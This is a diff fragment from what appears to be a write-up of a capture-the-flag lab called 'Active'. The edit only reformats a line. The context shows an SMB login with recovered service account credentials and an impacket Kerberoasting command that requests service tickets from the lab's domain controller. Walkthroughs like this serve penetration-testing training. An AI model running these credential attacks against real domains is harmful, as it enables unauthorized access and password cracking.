@@ -160,7 +160,8 @@ smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
 # Kerberoasting
 ```
 sudo ntpdate  10.10.10.100
-─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
